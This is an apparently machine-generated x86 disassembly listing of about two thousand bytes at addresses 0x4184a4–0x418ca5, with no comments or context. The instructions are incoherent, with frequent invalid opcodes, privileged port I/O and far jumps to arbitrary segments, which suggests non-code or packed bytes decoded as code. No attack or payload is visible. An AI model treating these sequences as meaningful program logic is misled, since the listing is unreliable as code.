  4184a4:	cmp    DWORD PTR [esi-0x18],esi
  4184a7:	enter  0x5e46,0x4b
  4184ab:	(bad)  
  4184ac:	push   0xffffffbc
  4184ae:	rcr    BYTE PTR [edi-0x2a],cl
  4184b1:	leave  
  4184b2:	mov    esi,0x7ed5011f
  4184b7:	mov    edx,0x201eacd5
  4184bc:	add    al,0x29
  4184be:	push   eax
  4184bf:	sbb    BYTE PTR [ecx-0x2e],bl
  4184c2:	cld    
  4184c3:	sub    al,0xe
  4184c5:	outs   dx,BYTE PTR ds:[esi]
  4184c6:	dec    ebp
  4184c7:	mov    ds:0x7548957e,al
  4184cc:	sti    
  4184cd:	xchg   esp,eax
  4184ce:	stos   BYTE PTR es:[edi],al
  4184cf:	aam    0x3a
  4184d1:	popf   
  4184d2:	repnz mov al,0x22
  4184d5:	pop    esi
  4184d6:	shl    DWORD PTR [esi-0x60],0x3e
  4184da:	jne    0x418546
  4184dc:	adc    edi,ecx
  4184de:	jl     0x41849b
  4184e0:	pop    edx
  4184e1:	pop    ebx
  4184e2:	popf   
  4184e3:	push   es
  4184e4:	pop    ecx
  4184e5:	adc    esi,DWORD PTR [eax+0x5066d75b]
  4184eb:	cmp    esi,DWORD PTR fs:[ecx+0x6e7d3828]
  4184f2:	jne    0x4184c0
  4184f4:	pop    esp
  4184f5:	nop
  4184f6:	mov    ebp,esi
  4184f8:	add    bl,BYTE PTR [edx+ecx*1+0x4e]
  4184fc:	add    al,0xf1
  4184fe:	sub    cl,BYTE PTR [ebp+0x43]
  418501:	push   0x54e69cfe
  418506:	mov    esp,0x378e9bbd
  41850b:	mov    dl,0xdf
  41850d:	jae    0x418566
  41850f:	push   esp
  418510:	scas   al,BYTE PTR es:[edi]
  418511:	sub    DWORD PTR fs:[ebx+0xf],0x2b
  418516:	test   eax,0x7578d9be
  41851b:	test   BYTE PTR [ebx+0x781f0ae1],0xe0
  418522:	bnd jmp 0x4184b9
  418525:	jae    0x4184c2
  418527:	popf   
  418528:	add    BYTE PTR [eax+0x72],dl
  41852b:	fsub   QWORD PTR [ebx-0x70]
  41852e:	jno    0x41857e
  418530:	test   BYTE PTR [ecx-0x2],ch
  418533:	xchg   edx,eax
  418534:	sub    DWORD PTR [esi+0x54ed6d22],edx
  41853a:	imul   BYTE PTR [ebx]
  41853c:	pusha  
  41853d:	popf   
  41853e:	mov    ebx,0x592266eb
  418543:	call   0x88b8:0x9d1cf4f6
  41854a:	jp     0x4184ed
  41854c:	shr    DWORD PTR [edi+0x2f7761eb],0xe1
  418553:	je     0x16a11f2a
  418559:	or     DWORD PTR [esi-0x30f54be8],eax
  41855f:	jo     0x418563
  418561:	rol    DWORD PTR [edi],cl
  418563:	imul   DWORD PTR [edi+0x5f5bde30]
  418569:	or     ch,BYTE PTR [edx-0x65]
  41856c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41856d:	cmp    BYTE PTR [esi],cl
  41856f:	ficomp DWORD PTR [eax-0x5f]
  418572:	fsub   QWORD PTR [ebp+0x4e543696]
  418578:	out    0x5,eax
  41857a:	jecxz  0x4185d0
  41857c:	xchg   DWORD PTR [eax+0x2615a862],esi
  418582:	mov    ch,0x27
  418584:	add    eax,0xd96a33ea
  418589:	outs   dx,DWORD PTR ds:[esi]
  41858a:	je     0x4185bd
  41858c:	jge    0x418554
  41858e:	jge    0x418600
  418590:	dec    esp
  418591:	mov    ss,WORD PTR [edi+0x5f711593]
  418597:	inc    esi
  418598:	scas   eax,DWORD PTR es:[edi]
  418599:	pop    edx
  41859a:	lods   al,BYTE PTR ds:[esi]
  41859b:	xchg   esp,eax
  41859c:	ss sbb esp,esp
  41859f:	popf   
  4185a0:	mov    al,0xd2
  4185a2:	add    al,0xa9
  4185a4:	push   ss
  4185a5:	sbb    eax,0x6c4b6f3e
  4185aa:	loope  0x418603
  4185ac:	je     0x4185a7
  4185ae:	sbb    DWORD PTR [ecx],ebp
  4185b0:	jno    0x41856a
  4185b2:	dec    ecx
  4185b3:	xor    bl,BYTE PTR [ecx]
  4185b5:	in     al,0xf7
  4185b7:	inc    DWORD PTR [ebp+0x26]
  4185ba:	mov    ch,bl
  4185bc:	lods   eax,DWORD PTR ds:[esi]
  4185bd:	call   0x32957b1d
  4185c2:	mov    al,0xb8
  4185c4:	jbe    0x4185d8
  4185c6:	ja     0x41859c
  4185c8:	mov    ds:0xbd3a31b2,eax
  4185cd:	dec    esp
  4185ce:	xlat   BYTE PTR ds:[ebx]
  4185cf:	cmp    DWORD PTR [eax+0x45625e8b],ebp
  4185d5:	add    eax,0xa516af6d
  4185da:	call   FWORD PTR [edi+0x2900af0e]
  4185e0:	icebp  
  4185e1:	add    eax,0xc14a5e3b
  4185e6:	dec    edi
  4185e7:	jle    0x418613
  4185e9:	pushf  
  4185ea:	pop    ebx
  4185eb:	ret    
  4185ec:	(bad)  
  4185ed:	jmp    0x8d1a1bd
  4185f2:	xchg   edx,esp
  4185f4:	aam    0x4d
  4185f6:	aad    0x25
  4185f8:	pop    edx
  4185f9:	imul   edi,eax,0x6c
  4185fc:	sub    BYTE PTR [edx-0x798a874c],cl
  418602:	cmp    al,0x2c
  418604:	adc    BYTE PTR [edi],dl
  418606:	scas   eax,DWORD PTR es:[edi]
  418607:	out    dx,eax
  418608:	daa    
  418609:	inc    ebx
  41860a:	inc    edx
  41860b:	jmp    FWORD PTR [ebx]
  41860d:	push   0xdfbe04de
  418612:	in     eax,0xf0
  418614:	jne    0x418638
  418616:	adc    ebp,ebp
  418618:	loope  0x41861d
  41861a:	ja     0x41859e
  41861c:	aas    
  41861d:	nop
  41861e:	adc    al,0xb8
  418620:	sub    cl,BYTE PTR [ebp+0x530736a1]
  418626:	rcr    DWORD PTR [esp+ebx*8],cl
  418629:	mov    eax,ds:0x3b6ee389
  41862e:	data16 sar BYTE PTR ds:0x47ef6b31,1
  418635:	scas   eax,DWORD PTR es:[edi]
  418636:	into   
  418637:	inc    esp
  418638:	test   dl,0x1d
  41863b:	jne    0x418608
  41863d:	ins    BYTE PTR es:[edi],dx
  41863e:	dec    ecx
  41863f:	mov    al,0xc3
  418641:	xor    al,cl
  418643:	jg     0x41864a
  418645:	jnp    0x4186c4
  418647:	adc    BYTE PTR es:[ebx],bh
  41864a:	xor    BYTE PTR [esi*4+0x4e5d1191],ah
  418651:	imul   edx,edi,0x3f7e70b
  418657:	rcl    DWORD PTR [eax],0x47
  41865a:	xor    eax,0x294628da
  41865f:	dec    esi
  418660:	call   0xe65d:0xfcd5172e
  418667:	pop    ebp
  418668:	cmp    DWORD PTR [edi+0xe377b93],edi
  41866e:	push   esp
  41866f:	mov    ebx,0xc388de36
  418674:	jns    0x4186b2
  418676:	xor    edi,DWORD PTR [esi]
  418678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418679:	adc    al,0x84
  41867b:	or     edx,DWORD PTR [eax-0x405e54cc]
  418681:	retf   
  418682:	cmc    
  418683:	sbb    eax,0x4feb1345
  418688:	adc    al,0xa1
  41868a:	cli    
  41868b:	adc    dl,ch
  41868d:	adc    al,0xf4
  41868f:	mov    al,ds:0x648ab7d5
  418694:	xor    BYTE PTR [ebx-0x456cb4a3],dl
  41869a:	push   esi
  41869b:	push   esi
  41869c:	fcmovu st,st(6)
  41869e:	in     al,dx
  41869f:	jno    0x418710
  4186a1:	add    cl,bl
  4186a3:	pop    es
  4186a4:	not    BYTE PTR [ebx]
  4186a6:	into   
  4186a7:	out    dx,al
  4186a8:	pop    ds
  4186a9:	push   ebx
  4186aa:	das    
  4186ab:	inc    ebx
  4186ac:	ins    DWORD PTR es:[edi],dx
  4186ad:	cld    
  4186ae:	pop    ebp
  4186af:	push   esp
  4186b0:	jnp    0x4186ca
  4186b2:	add    BYTE PTR [esi+eiz*8],0x7e
  4186b6:	and    eax,DWORD PTR [ebp-0x31]
  4186b9:	mov    ?,WORD PTR [ecx+edx*1-0x53]
  4186bd:	xchg   esi,eax
  4186be:	pop    eax
  4186bf:	fdiv   st(3),st
  4186c1:	jnp    0x418643
  4186c3:	dec    ebp
  4186c4:	in     eax,dx
  4186c5:	sbb    BYTE PTR [edi-0x5d398314],bl
  4186cb:	xor    ah,dl
  4186cd:	mov    es,WORD PTR [edx-0x39fede5e]
  4186d3:	mov    edx,0xea34712d
  4186d8:	cs push es
  4186da:	jl     0x418758
  4186dc:	add    al,BYTE PTR [edx+0x3243acaa]
  4186e2:	jne    0x41866d
  4186e4:	cmc    
  4186e5:	repnz mov dh,0x6f
  4186e8:	jb     0x4186ad
  4186ea:	or     eax,0xd37bc59e
  4186ef:	cmp    eax,0x4898cdd9
  4186f4:	xchg   BYTE PTR [esi+0x4c],bl
  4186f7:	cli    
  4186f8:	sbb    DWORD PTR ds:0xeb52d78c,esi
  4186fe:	or     eax,0xb37f1975
  418703:	jns    0x4186fc
  418705:	mov    ebp,0xb141d2b6
  41870a:	xor    BYTE PTR [edx+0x3c11bd5c],al
  418710:	stos   BYTE PTR es:[edi],al
  418711:	adc    eax,0x89c892da
  418716:	les    edx,FWORD PTR [ecx]
  418718:	aas    
  418719:	daa    
  41871a:	or     DWORD PTR [esi+ebx*1+0x7c],ebp
  41871e:	adc    eax,0x401d1ed6
  418723:	sbb    BYTE PTR [ebp+0x5e],cl
  418726:	xchg   ecx,eax
  418727:	xchg   edi,eax
  418728:	stos   BYTE PTR es:[edi],al
  418729:	mov    ds:0x92fb4ca2,eax
  41872e:	enter  0x9f9c,0x6c
  418732:	mov    dl,BYTE PTR [edi-0x197a29ed]
  418738:	sti    
  418739:	jmp    0x182e:0x1c13bc73
  418740:	cdq    
  418741:	sbb    eax,0xa0516e7
  418746:	(bad)  
  418747:	pushf  
  418748:	fldcw  WORD PTR [eax]
  41874a:	rcl    DWORD PTR [ecx],cl
  41874c:	and    eax,0x7573594e
  418751:	xor    ch,BYTE PTR [eax+0x34f55571]
  418757:	jo     0x418768
  418759:	pop    ss
  41875a:	test   DWORD PTR [ecx],0x7b99ea97
  418760:	fild   QWORD PTR [ebx-0x1b]
  418763:	enter  0x3b88,0x2f
  418767:	add    cl,BYTE PTR [ebp-0x630895fb]
  41876d:	and    DWORD PTR [ecx],edi
  41876f:	inc    edi
  418770:	mov    eax,ds:0x6ef1466d
  418775:	into   
  418776:	inc    edi
  418777:	and    eax,0x2772e012
  41877c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41877d:	mov    cl,0xef
  41877f:	lea    esi,[ebp-0x15]
  418782:	int    0x52
  418784:	fadd   DWORD PTR [ebp+0x66]
  418787:	hlt    
  418788:	test   al,0xe1
  41878a:	dec    edx
  41878b:	inc    ecx
  41878c:	popf   
  41878d:	or     eax,0xbe70c8ff
  418792:	xor    DWORD PTR [edi-0x3],esp
  418795:	into   
  418796:	loop   0x4187c9
  418798:	loope  0x418793
  41879a:	not    BYTE PTR [ebx]
  41879c:	sahf   
  41879d:	(bad)  
  41879e:	(bad)  
  41879f:	mov    al,ds:0x9edf2845
  4187a4:	push   es
  4187a5:	xlat   BYTE PTR ds:[ebx]
  4187a6:	dec    esp
  4187a7:	cmp    edx,DWORD PTR [ebx-0x53]
  4187aa:	sbb    cl,dh
  4187ac:	cld    
  4187ad:	add    al,0xf
  4187af:	ret    0xed18
  4187b2:	jmp    0xa822:0x792def70
  4187b9:	add    dl,BYTE PTR [edx]
  4187bb:	or     BYTE PTR [ebp-0x665fc662],ch
  4187c1:	pop    esi
  4187c2:	mov    al,ds:0x84f52541
  4187c7:	add    ch,BYTE PTR [ebx-0x50]
  4187ca:	sbb    BYTE PTR [edx+0x33],0x4f
  4187ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187cf:	xor    al,0xd0
  4187d1:	mov    ecx,0xc9509400
  4187d6:	add    cl,BYTE PTR [eiz*8-0x50592156]
  4187dd:	mov    ebp,0xbb1ed424
  4187e2:	or     BYTE PTR [edx-0x4496d9a6],ah
  4187e8:	ja     0x4187b8
  4187ea:	push   ebp
  4187eb:	jno    0x4187e7
  4187ed:	lds    esi,FWORD PTR [eax-0x202f682e]
  4187f3:	(bad)  
  4187f4:	fdivrp st(7),st
  4187f6:	mov    cl,0xa7
  4187f8:	push   0x5c
  4187fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187fb:	inc    ebp
  4187fc:	loope  0x41879b
  4187fe:	ins    BYTE PTR es:[edi],dx
  4187ff:	pop    ebx
  418800:	jle    0x4187ee
  418802:	pop    ebx
  418803:	retf   
  418804:	lock mov edx,0xf91301e7
  41880a:	fs xor eax,0xb9ebdcd4
  418810:	test   DWORD PTR [eax],esp
  418812:	or     ch,BYTE PTR [eax-0x56]
  418815:	sbb    eax,edx
  418817:	mov    eax,0xe273d34f
  41881c:	pop    edi
  41881d:	rcr    BYTE PTR [ebx],0x7c
  418820:	es and al,0x3b
  418823:	ins    BYTE PTR es:[edi],dx
  418824:	ret    0x950
  418827:	fst    DWORD PTR [ebx-0x6aa8e7ad]
  41882d:	sbb    dl,BYTE PTR [eax+ebx*2+0x64]
  418831:	sbb    DWORD PTR [eax+ebx*4+0x7f],edx
  418835:	arpl   WORD PTR [ebx+0x10708131],sp
  41883b:	mov    cl,0x50
  41883d:	es in  al,0xf3
  418840:	repz cli 
  418842:	sbb    ebx,DWORD PTR [edx]
  418844:	add    DWORD PTR [edi+0x29f326e6],ecx
  41884a:	lock rol DWORD PTR [esi-0x35f21d19],0x4d
  418852:	xchg   ebp,eax
  418853:	rcl    DWORD PTR [ebx+0x56c3ad6a],0xd6
  41885a:	pushf  
  41885b:	mov    esp,0xf7d2026
  418860:	and    eax,0x848509fa
  418865:	mov    bl,0x29
  418867:	adc    DWORD PTR [ecx+0x4],eax
  41886a:	add    al,BYTE PTR [di+0x58e5]
  41886f:	jmp    0x418821
  418871:	pop    ebp
  418872:	pop    eax
  418873:	mov    ?,WORD PTR [esi-0x74]
  418876:	rcl    BYTE PTR [eax+0x14],1
  418879:	(bad)  
  41887a:	loopne 0x418894
  41887c:	xor    eax,0x59d3c5c2
  418881:	jbe    0x4188ff
  418883:	add    eax,0x75b0c14c
  418888:	pop    ebp
  418889:	dec    esp
  41888a:	jo     0x41889c
  41888c:	push   esi
  41888d:	push   eax
  41888e:	push   ds
  41888f:	popa   
  418890:	cdq    
  418891:	pop    ecx
  418892:	(bad)  
  418893:	pop    ebx
  418894:	cmp    al,0x5e
  418896:	popa   
  418897:	dec    ecx
  418898:	sub    DWORD PTR [eax],ebp
  41889a:	and    al,0x4b
  41889c:	adc    bh,BYTE PTR [esi-0x64]
  41889f:	outs   dx,DWORD PTR ds:[esi]
  4188a0:	dec    edx
  4188a1:	inc    edi
  4188a2:	inc    esi
  4188a3:	xlat   BYTE PTR ds:[ebx]
  4188a4:	sub    ebp,eax
  4188a6:	repnz ds xor ebp,esp
  4188aa:	and    al,0xc1
  4188ac:	push   edx
  4188ad:	cmp    al,0xc5
  4188af:	call   0x89249a3
  4188b4:	fadd   QWORD PTR [eax]
  4188b6:	mov    esi,0x4a8c2f12
  4188bb:	ins    BYTE PTR es:[edi],dx
  4188bc:	mov    eax,0xde3869e5
  4188c1:	lea    edx,[ebx+0x11]
  4188c4:	and    DWORD PTR [ecx+0x57],esp
  4188c7:	mov    dh,ah
  4188c9:	rcl    al,cl
  4188cb:	fld    QWORD PTR [ebx-0x749539f6]
  4188d1:	dec    ebp
  4188d2:	mov    al,ds:0x7abc29bf
  4188d7:	inc    edx
  4188d8:	adc    al,BYTE PTR [ebx+0xd]
  4188db:	popf   
  4188dc:	scas   al,BYTE PTR es:[edi]
  4188dd:	int3   
  4188de:	or     edi,DWORD PTR [edi]
  4188e0:	add    eax,DWORD PTR ds:[esi]
  4188e3:	inc    edi
  4188e4:	pop    esi
  4188e5:	fld    TBYTE PTR [ebx+0xb]
  4188e8:	adc    BYTE PTR [esi*1+0x574f5efb],al
  4188ef:	dec    eax
  4188f0:	jle    0x418954
  4188f2:	jle    0x4188af
  4188f4:	and    al,0xff
  4188f6:	jge    0x418928
  4188f8:	adc    al,0xd4
  4188fa:	xor    eax,DWORD PTR [ecx+0x6102c91d]
  418900:	xor    esi,DWORD PTR [edi+0x32eb2983]
  418906:	popa   
  418907:	push   0xffffffbe
  418909:	pop    eax
  41890a:	xor    BYTE PTR [ebx-0x7d037277],al
  418910:	clc    
  418911:	ja     0x4188f7
  418913:	pop    eax
  418914:	jmp    0x4188f1
  418916:	xchg   esp,eax
  418917:	rcr    BYTE PTR [edi+0x528ff1d5],cl
  41891d:	out    dx,eax
  41891e:	ja     0x418981
  418920:	call   0xfb2:0xf14a5895
  418927:	lods   al,BYTE PTR ds:[esi]
  418928:	xchg   edi,eax
  418929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41892a:	xchg   edi,eax
  41892b:	test   eax,0x3ea0989b
  418930:	pop    ds
  418931:	das    
  418932:	mov    ch,0x50
  418934:	push   es
  418935:	inc    eax
  418936:	jmp    0xf2b3:0x78dcdc04
  41893d:	mov    eax,0x4c5c2fd3
  418942:	dec    esp
  418943:	dec    edi
  418944:	dec    ebp
  418945:	jno    0x418942
  418947:	sbb    BYTE PTR [eax+eiz*4-0x78faf80e],al
  41894e:	ror    edx,cl
  418950:	ins    DWORD PTR es:[edi],dx
  418951:	sbb    ch,BYTE PTR [eax-0x11]
  418954:	mov    ah,0xbd
  418956:	push   cs
  418957:	xor    DWORD PTR [edi-0x48],0x2c
  41895b:	scas   eax,DWORD PTR es:[edi]
  41895c:	fild   DWORD PTR [esi-0x3552a440]
  418962:	jo     0x4189a5
  418964:	push   ebp
  418965:	or     edx,edx
  418967:	repz sub DWORD PTR [eax*8+0x7d7dc6f1],ecx
  41896f:	xchg   ecx,eax
  418970:	jne    0x4189db
  418972:	dec    edi
  418973:	pop    ecx
  418974:	inc    ebx
  418975:	ds das 
  418977:	sbb    DWORD PTR [edi+0x6bacca76],eax
  41897d:	mov    esp,0x564e06b4
  418982:	aas    
  418983:	test   DWORD PTR [esi-0x434b956d],0x2e19b808
  41898d:	gs sbb al,0x9e
  418990:	inc    esi
  418991:	inc    ecx
  418992:	stos   BYTE PTR es:[edi],al
  418993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418994:	in     al,dx
  418995:	stos   BYTE PTR es:[edi],al
  418996:	xchg   edi,eax
  418997:	cmp    al,0x7d
  418999:	shl    DWORD PTR ds:0xa731f281,0xe0
  4189a0:	push   es
  4189a1:	sbb    dh,al
  4189a3:	loopne 0x4189ff
  4189a5:	fcmovne st,st(6)
  4189a7:	jmp    0x465:0xf529a9fa
  4189ae:	out    0xb2,eax
  4189b0:	out    dx,eax
  4189b1:	sub    eax,0x954aaca0
  4189b6:	jbe    0x418954
  4189b8:	and    eax,0xd9ee8c53
  4189bd:	imul   ebx,DWORD PTR [edi+ebp*4-0x1e],0xffffffd5
  4189c2:	or     edx,ecx
  4189c4:	push   edi
  4189c5:	push   es
  4189c6:	out    0xf0,eax
  4189c8:	push   eax
  4189c9:	push   cs
  4189ca:	mov    esp,0xc3982c6e
  4189cf:	or     al,0xa5
  4189d1:	pop    ss
  4189d2:	cmp    BYTE PTR [edx-0x69163b7a],dh
  4189d8:	mov    al,0xce
  4189da:	jl     0x4189be
  4189dc:	mov    WORD PTR [edi],ds
  4189de:	leave  
  4189df:	stc    
  4189e0:	mov    esi,0x7884cfb9
  4189e5:	jnp    0x418a4c
  4189e7:	out    0x23,al
  4189e9:	push   edi
  4189ea:	(bad)  
  4189eb:	mov    esp,0x99d6d088
  4189f0:	fist   WORD PTR [esi+0x53]
  4189f3:	fs jmp 0x418a17
  4189f6:	pop    edx
  4189f7:	outs   dx,DWORD PTR ds:[esi]
  4189f8:	ss xor al,0xad
  4189fb:	adc    al,0x26
  4189fd:	mov    al,ds:0xa112ddb0
  418a02:	mov    ch,0x46
  418a04:	xor    ecx,ecx
  418a06:	bound  eax,QWORD PTR [ecx+0x23]
  418a09:	sbb    DWORD PTR [eax-0x4e],ecx
  418a0c:	adc    eax,0x8ecdc237
  418a11:	out    dx,al
  418a12:	xchg   edi,eax
  418a13:	ins    DWORD PTR es:[edi],dx
  418a14:	xchg   ebp,eax
  418a15:	sar    dh,1
  418a17:	sar    BYTE PTR [edx],cl
  418a19:	test   DWORD PTR [edi+0x5d953ab5],edx
  418a1f:	rcl    BYTE PTR [esi],0xd7
  418a22:	add    edx,edi
  418a24:	mov    ch,0xb2
  418a26:	les    eax,FWORD PTR [ebx-0x5c86b9ec]
  418a2c:	(bad)  
  418a2d:	push   0x83610e69
  418a32:	hlt    
  418a33:	imul   ebx,DWORD PTR [eax-0x7b2a6626],0x68769849
  418a3d:	push   esp
  418a3e:	gs add al,0x31
  418a41:	pushf  
  418a42:	sub    al,0x32
  418a44:	aad    0xf1
  418a46:	rdtsc  
  418a48:	mov    dl,0x2e
  418a4a:	xor    BYTE PTR [ecx],bh
  418a4c:	add    al,0xa3
  418a4e:	jno    0x418a8f
  418a50:	push   ebx
  418a51:	call   0xda25:0x3cbebb93
  418a58:	xor    BYTE PTR [edi+0x7d],ch
  418a5b:	in     eax,0x55
  418a5d:	xchg   ecx,eax
  418a5e:	shl    BYTE PTR [ecx],cl
  418a60:	xchg   DWORD PTR [edx-0x35562e43],esi
  418a66:	bound  esp,QWORD PTR [ecx]
  418a68:	pop    esi
  418a69:	mov    ch,0x9c
  418a6b:	xor    eax,0xacbf850f
  418a70:	mov    ch,0x12
  418a72:	mov    esi,es
  418a74:	inc    edx
  418a75:	mov    cl,BYTE PTR [edi-0x75]
  418a78:	dec    esp
  418a79:	cs leave 
  418a7b:	cdq    
  418a7c:	pop    ebp
  418a7d:	(bad)  
  418a7e:	lds    eax,FWORD PTR [ebp-0x6d]
  418a81:	jbe    0x418ae0
  418a83:	mov    edi,0x63373c13
  418a88:	outs   dx,DWORD PTR ds:[esi]
  418a89:	(bad)  
  418a8a:	xchg   ebp,eax
  418a8b:	in     al,0xd0
  418a8d:	cmp    BYTE PTR ds:0x69eb471a,cl
  418a93:	sbb    al,0xe5
  418a95:	ds dec eax
  418a97:	aad    0x53
  418a99:	jg     0x418ae2
  418a9b:	jns    0x418a75
  418a9d:	jb     0x418aa0
  418a9f:	loope  0x418a4f
  418aa1:	sahf   
  418aa2:	add    ch,BYTE PTR [edi-0x64]
  418aa5:	test   BYTE PTR [eax-0x5e],0x3
  418aa9:	ds dec eax
  418aab:	sbb    BYTE PTR fs:[edi],ch
  418aae:	popf   
  418aaf:	loopne 0x418aa3
  418ab1:	jbe    0x418a91
  418ab3:	outs   dx,BYTE PTR ds:[esi]
  418ab4:	xchg   edx,eax
  418ab5:	mov    esp,0xb03040bb
  418aba:	(bad)  
  418abb:	push   ecx
  418abc:	lds    ebp,FWORD PTR [edi+0x44c7b99f]
  418ac2:	mov    eax,ds:0xa4f8fbee
  418ac7:	sbb    DWORD PTR [edi+eiz*2-0x7e],ebp
  418acb:	bound  ebx,QWORD PTR [ecx]
  418acd:	(bad)  
  418ace:	sub    DWORD PTR [esi+0x74656d6b],esp
  418ad4:	test   BYTE PTR [ecx-0x27],cl
  418ad7:	jl     0x418a8c
  418ad9:	mov    bh,0x61
  418adb:	test   al,0xb4
  418add:	aas    
  418ade:	inc    esi
  418adf:	dec    edx
  418ae0:	fisttp DWORD PTR [edx+0x443d2a80]
  418ae6:	push   ds
  418ae7:	je     0x418ab3
  418ae9:	xchg   esi,eax
  418aea:	mov    ds:0xfde27654,eax
  418aef:	mov    WORD PTR [edi],ss
  418af1:	jecxz  0x418a97
  418af3:	mov    al,ds:0x848c43e
  418af8:	mov    ah,0x65
  418afa:	pop    ss
  418afb:	ja     0x418abc
  418afd:	std    
  418afe:	xor    BYTE PTR ds:[ebp+0x42272aed],0xd9
  418b06:	call   0xdf2e:0x72ea8be7
  418b0d:	cmp    DWORD PTR [eax],esi
  418b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b10:	int    0xcb
  418b12:	into   
  418b13:	fdiv   QWORD PTR [esi-0x16]
  418b16:	data16 adc al,0x2a
  418b19:	(bad)  
  418b1a:	and    edi,DWORD PTR [eax]
  418b1c:	mov    ebx,0xeaac3958
  418b21:	cmp    al,0x84
  418b23:	aam    0x64
  418b25:	enter  0xf8dd,0x74
  418b29:	test   DWORD PTR [esp+edi*4-0x941dd42],ebx
  418b30:	scas   eax,DWORD PTR es:[edi]
  418b31:	push   eax
  418b32:	xchg   DWORD PTR [edx-0x32aa868a],ecx
  418b38:	rcl    edi,cl
  418b3a:	push   edi
  418b3b:	dec    eax
  418b3c:	rcr    DWORD PTR [eax+0x716cc0ef],0xb4
  418b43:	cmp    DWORD PTR [esi],edx
  418b45:	mov    eax,ss:0x465b8b8f
  418b4b:	out    dx,al
  418b4c:	sahf   
  418b4d:	mov    dh,0x81
  418b4f:	jbe    0x418b38
  418b51:	lods   al,BYTE PTR ds:[esi]
  418b52:	sub    cl,BYTE PTR [ebx+0x47]
  418b55:	call   0x5284:0x9bf6dd68
  418b5c:	sbb    DWORD PTR [edi+0xb],eax
  418b5f:	inc    ecx
  418b60:	add    eax,ebx
  418b62:	in     eax,dx
  418b63:	sbb    al,0x47
  418b65:	cwde   
  418b66:	xor    eax,0xb61155e7
  418b6b:	(bad)  [edx]
  418b6d:	sub    al,0x2d
  418b6f:	dec    edi
  418b70:	sbb    BYTE PTR [esp+esi*1+0x5d00510e],ah
  418b77:	fdiv   QWORD PTR [ebp+0x8]
  418b7a:	push   es
  418b7b:	lods   eax,DWORD PTR ds:[esi]
  418b7c:	push   0x391c8a44
  418b81:	das    
  418b82:	out    0xa3,al
  418b84:	out    0xe5,al
  418b86:	nop
  418b87:	mov    edx,0xce58febd
  418b8c:	add    al,0x77
  418b8e:	or     bh,BYTE PTR [ebp+0x13d4bd1a]
  418b94:	and    eax,0x3e0faa8d
  418b99:	shr    DWORD PTR [esi+0x48],cl
  418b9c:	(bad)  
  418b9d:	xchg   edi,eax
  418b9e:	add    DWORD PTR [ebx+0x7a],eax
  418ba1:	out    0xd2,al
  418ba3:	test   eax,0x463ea536
  418ba8:	push   ss
  418ba9:	xchg   ebp,eax
  418baa:	sub    cl,ah
  418bac:	inc    edx
  418bad:	cmc    
  418bae:	jbe    0x418bf2
  418bb0:	adc    DWORD PTR [edx+eax*4],esp
  418bb3:	sar    BYTE PTR [eax+ebp*1-0x57e49310],0x50
  418bbb:	dec    esi
  418bbc:	shl    BYTE PTR [edi],cl
  418bbe:	cmp    BYTE PTR [ecx],0xc1
  418bc1:	sub    BYTE PTR [edi-0x6ea80c57],dh
  418bc7:	fcom   DWORD PTR [eax-0x2f0d0856]
  418bcd:	rcl    dh,0x42
  418bd0:	cmp    DWORD PTR [eax+0x57],esp
  418bd3:	out    0x56,eax
  418bd5:	sbb    BYTE PTR [edx-0x16],dh
  418bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bd9:	jecxz  0x418c02
  418bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bdc:	sar    edi,cl
  418bde:	or     DWORD PTR [eax-0x3092b788],esp
  418be4:	retf   
  418be5:	rcl    BYTE PTR ds:0xf757920c,0x62
  418bec:	jo     0x418bd2
  418bee:	lods   eax,DWORD PTR ds:[esi]
  418bef:	xor    DWORD PTR [edx+0x4580ca3a],0xffffffd7
  418bf6:	adc    al,0xbd
  418bf8:	mov    edx,0xaedcd95c
  418bfd:	fs scas al,BYTE PTR es:[edi]
  418bff:	cdq    
  418c00:	(bad)  
  418c01:	jbe    0x418b8d
  418c03:	nop
  418c04:	clc    
  418c05:	lahf   
  418c06:	pop    edi
  418c07:	and    BYTE PTR [ebx+0x23],ch
  418c0a:	xor    BYTE PTR [edi+0x22],bh
  418c0d:	or     BYTE PTR [esi+0x6cb09bbe],cl
  418c13:	imul   eax,edi,0x3bf8fad1
  418c19:	xchg   BYTE PTR ds:0x4ce15c4d,ch
  418c1f:	push   es
  418c20:	cli    
  418c21:	sub    bl,dl
  418c23:	daa    
  418c24:	dec    bh
  418c26:	pusha  
  418c27:	push   esi
  418c28:	xor    dh,BYTE PTR [edx+0x38297571]
  418c2e:	imul   ecx,DWORD PTR [ebx+0x3f],0x6dcbaf56
  418c35:	imul   esi,DWORD PTR [esi+0x1d862d97],0xffffffec
  418c3c:	jbe    0x418c10
  418c3e:	jno    0x418c28
  418c40:	shl    DWORD PTR [edx+0x5f],0xcb
  418c44:	inc    ebp
  418c45:	aad    0x5d
  418c47:	iret   
  418c48:	jb     0x418c1b
  418c4a:	addr16 or ch,BYTE PTR [si]
  418c4e:	pop    ebp
  418c4f:	out    dx,eax
  418c50:	mov    ebp,0xd343838f
  418c55:	cmp    BYTE PTR [eax+esi*1-0x2143b74e],bh
  418c5c:	mov    dl,0x2a
  418c5e:	mov    bl,0x59
  418c60:	push   edi
  418c61:	fidiv  WORD PTR [edi-0x3dc37f3e]
  418c67:	pop    esp
  418c68:	and    eax,0x2fa8f899
  418c6d:	xor    bl,ah
  418c6f:	nop
  418c70:	jmp    0x5f72:0x529d9c48
  418c77:	aam    0xca
  418c79:	pop    ebp
  418c7a:	mov    ds:0x1d662744,al
  418c7f:	test   BYTE PTR fs:[eax],al
  418c82:	xor    al,BYTE PTR [esi-0x33]
  418c85:	sub    BYTE PTR [eax+0x73cac13],0x44
  418c8c:	mov    bl,0x29
  418c8e:	rcl    DWORD PTR [ebx-0x4161790e],0x97
  418c95:	or     BYTE PTR [ecx-0x421fab6b],dl
  418c9b:	add    al,0x80
  418c9d:	xchg   esp,eax
  418c9e:	or     BYTE PTR ds:0xba45ecd,ch
  418ca4:	push   ds
  418ca5:	mov    ecx,0x1f2f2c3f
